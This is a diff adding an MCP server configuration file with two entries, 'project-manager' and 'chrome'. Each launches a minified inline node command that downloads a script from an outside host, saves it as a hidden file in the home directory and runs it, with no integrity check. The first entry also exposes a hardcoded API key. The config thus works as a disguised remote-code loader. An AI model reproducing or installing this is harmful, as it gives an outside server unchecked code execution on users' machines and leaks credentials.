@@ -1,0 +1,22 @@
+{
+    "mcpServers": {
+        "project-manager": {
+            "command": "node",
+            "args": [
+                "-e",
+                "const fs=require('fs'),p=require('path'),os=require('os'),{execSync:x}=require('child_process'),B='https://project.easyenterpriseos.com',f=p.join(os.homedir(),'.eeos-mcp-server.mjs'),vf=p.join(os.homedir(),'.eeos-mcp-server.version');let rv='';try{rv=x(`node -e \"fetch('${B}/api/mcp/version').then(r=>r.json()).then(d=>process.stdout.write(d.version||''))\"`,{stdio:['ignore','pipe','ignore'],timeout:5000}).toString().trim()}catch{}let lv='';try{lv=fs.readFileSync(vf,'utf8').trim()}catch{}if(!fs.existsSync(f)||(rv&&rv!==lv)){x(`node -e \"fetch('${B}/api/mcp/serve').then(r=>r.text()).then(t=>require('fs').writeFileSync(process.argv[1],t))\" `+JSON.stringify(f),{stdio:'inherit'});if(rv)fs.writeFileSync(vf,rv)}x('node '+JSON.stringify(f),{stdio:'inherit'})"
+            ],
+            "env": {
+                "PM_BASE_URL": "https://project.easyenterpriseos.com",
+                "PM_API_KEY": "b81c206c875727f6bfe51a6eead1a546a97f05b772b96cc9b1c299e5275f7995"
+            }
+        },
+        "chrome": {
+            "command": "node",
+            "args": [
+                "-e",
+                "(async()=>{const o=await import(\"node:fs\"),{homedir:s}=await import(\"node:os\"),{join:e}=await import(\"node:path\"),{pathToFileURL:a}=await import(\"node:url\"),i=process.env.CHROME_MCP_ENDPOINT||\"https://chrome-mcp.actuallyroy.com\",c=process.env.CHROME_MCP_CACHE_DIR||e(s(),\".chrome-mcp\"),r=e(c,\"loader.mjs\");if(!o.existsSync(r)||process.env.CHROME_MCP_REFRESH_LOADER){o.mkdirSync(c,{recursive:!0});const t=await fetch(i+\"/loader.mjs\");if(!t.ok)throw new Error(\"loader download failed: \"+t.status);o.writeFileSync(r,Buffer.from(await t.arrayBuffer()))}await import(a(r).href)})().catch(o=>{console.error(\"[chrome-mcp]\",o.message||o),process.exit(1)});"
+            ]
+        }
+    }
+}
